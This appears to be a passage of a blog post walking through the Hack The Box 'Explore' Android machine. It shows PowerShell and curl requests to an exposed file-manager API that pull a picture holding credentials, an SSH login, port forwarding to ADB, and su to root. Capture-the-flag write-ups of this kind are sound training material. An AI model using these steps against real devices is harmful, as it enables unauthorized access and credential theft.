+    </span><span class="n">Invoke-RestMethod</span><span class="w"> </span><span class="nt">-method</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="nt">-header</span><span class="w"> </span><span class="p">@{</span><span class="s2">"Content-Type"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"application/json"</span><span class="p">}</span><span class="w"> </span><span class="nt">-body</span><span class="w"> </span><span class="s2">"{'command':'</span><span class="nv">$method</span><span class="s2">'}"</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://10.10.10.247:59777</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>From the received output, the most interesting result was one picture called <code class="language-plaintext highlighter-rouge">creds.jpg</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; Method: listPics
+
+name     : concept.jpg
+time     : 4/21/21 02:38:08 AM
+location : /storage/emulated/0/DCIM/concept.jpg
+size     : 135.33 KB (138,573 Bytes)
+
+name     : anc.png
+time     : 4/21/21 02:37:50 AM
+location : /storage/emulated/0/DCIM/anc.png
+size     : 6.24 KB (6,392 Bytes)
+
+name     : creds.jpg
+time     : 4/21/21 02:38:18 AM
+location : /storage/emulated/0/DCIM/creds.jpg
+size     : 1.14 MB (1,200,401 Bytes)
+
+name     : 224_anc.png
+time     : 4/21/21 02:37:21 AM
+location : /storage/emulated/0/DCIM/224_anc.png
+size     : 124.88 KB (127,876 Bytes)
+</code></pre></div></div>
+
+<p>To download the file used the command below, also permited by the vulnerable app found:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span> http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg <span class="nt">-o</span> creds.jpg
+</code></pre></div></div>
+
+<p>Opening the image in a viewer, noticed that we had some credentials on it: <strong>kristi:Kr1sT!5h@Rp3xPl0r3!</strong></p>
+
+<p><img src="https://i.imgur.com/senu2Y7.png" alt="HTB Explore - creds.jpg" class="align-center"></p>
+
+<p>These credentials allowed me to connect through SSH on port 2222, as previously enumerated. The first flag was found at <code class="language-plaintext highlighter-rouge">/sdcard/user.txt</code> file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh kristi@10.10.10.247 <span class="nt">-p</span> 2222
+Password authentication
+Password:
+:/ <span class="nv">$ </span><span class="nb">cd</span> /sdcard/
+:/sdcard <span class="nv">$ </span><span class="nb">cat </span>user.txt
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>As now we have SSH rights to this box, we could get root access using ADB shell using SSH Local Port redirection, where I’ve redirected my attacker’s machine 5555/TCP to 5555/TCP in the target, via SSH as seen in the previously mentioned post.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh kristi@10.10.10.247 <span class="nt">-p</span> 2222 <span class="nt">-L</span> 5555:127.0.0.1:5555
+Password authentication
+Password:
+:/ <span class="err">$</span>
+</code></pre></div></div>
+
+<p>After this process, just needed to connect to <code class="language-plaintext highlighter-rouge">adb</code> in attacker machine from port redirection, tunneled through SSH connection and, to get <code class="language-plaintext highlighter-rouge">root</code> access, just needed to issue the command <code class="language-plaintext highlighter-rouge">su</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>adb connect 127.0.0.1:5555
+connected to 127.0.0.1:5555
+<span class="nv">$ </span>adb shell
+x86_64:/ <span class="nv">$ </span>su
+:/ <span class="c"># find / -type f 2&gt; /dev/null | grep root.txt</span>
+/data/root.txt
+:/ <span class="c"># cat /data/root.txt</span>
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<p>I hope you guys have enjoyed this box!</p>
+
+<p>See you in the next post <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/en-US/tag/#hackthebox" class="page__taxonomy-item p-category" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      <a href="/en-US/tag/#htb-android" class="page__taxonomy-item p-category" rel="tag">HTB Android</a><span class="sep">, </span>
+    
+      <a href="/en-US/tag/#htb-easy" class="page__taxonomy-item p-category" rel="tag">HTB Easy</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/en-US/categories/#walkthrough" class="page__taxonomy-item p-category" rel="tag">Walkthrough</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-10-30T13:00:00-03:00">October 30, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share" id="sharelinks">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <!-- CUSTOM: Localized sharing links -->
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Walktrough%3A+HTB+Explore%20https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F10%2Fhtb-explore" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F10%2Fhtb-explore" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F10%2Fhtb-explore" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F10%2Fhtb-explore" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F10%2Fhtb-explore&amp;text=Walktrough%3A+HTB+Explore" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+  <!-- END CUSTOM: Localized sharing links -->
+</section>
+
+
+      
+  <nav class="pagination">
+    
+    
+      <a href="/en-US/walkthrough/2021/10/htb-dynstr" class="pagination--pager" title="Walktrough: HTB Dynstr
+">Previous</a>
+    
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Leave a comment</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/89b1SdH.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/10/htb-dynstr" rel="permalink">Walktrough: HTB Dynstr
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-16T13:00:00-03:00">October 16, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          12 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/10/htb-explore">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Dynstr, another medium-rated Linux box from Hack The Box, created by jkr.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/JkBtXmO.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/10/htb-cap" rel="permalink">Walktrough: HTB Cap
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-02T13:00:00-03:00">October 2, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/10/htb-explore">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Cap, another easy-rated Linux box from Hack The Box, created by InfoSecJack.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/pUqq7fY.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/09/htb-pit" rel="permalink">Walktrough: HTB Pit
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-09-25T09:00:00-03:00">September 25, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          12 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/10/htb-explore">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Pit, another medium-rated Linux box from Hack The Box, created by polarbearer and GibParadox.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/ksBoJIQ.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/09/htb-schooled" rel="permalink">Walktrough: HTB Schooled
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-09-11T00:00:00-03:00">September 11, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          11 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/10/htb-explore">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Schooled, another medium-rated Linux box from Hack The Box, created by TheCyberGeek.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Mermaid.js -->
+<script type="module">
+    import mermaid from 'https://unpkg.com/mermaid@9/dist/mermaid.esm.min.mjs';
+    const config = {
+        "theme": "dark", 
+        "startOnLoad": true
+    };
+    mermaid.initialize(config);
+</script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+    <!-- start custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
+    
+      <li><a href="/en-US/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+    <li><a href="https://davicruz.com/en-US/terms-and-privacy/" rel="nofollow noopener noreferrer"><i class="fas fa-user-shield" aria-hidden="true"></i> Terms of Service and Privacy Policy</a></li>
+    <!--<li><a onclick="return klaro.show();"><i class="fas fa-shield-alt" aria-hidden="true"></i> Review consent</a></li>-->
+    
+      
+        
+          <li><a href="/">Disponível também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></li>
+        
+        
+        
+      
+    
+      
+    
+    <!-- end custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2023 Davi Cruz. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a> &amp; <a href="https://github.com/kurtsson/jekyll-multiple-languages-plugin" rel="nofollow">Multiple Languages Plugin</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz-blog');
+    // CUSTOM : Utterances post mapping due to Jekyll Multilanguage
+    script.setAttribute('issue-term', 'htb-explore');
+    
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+
+  </body>
+</html>
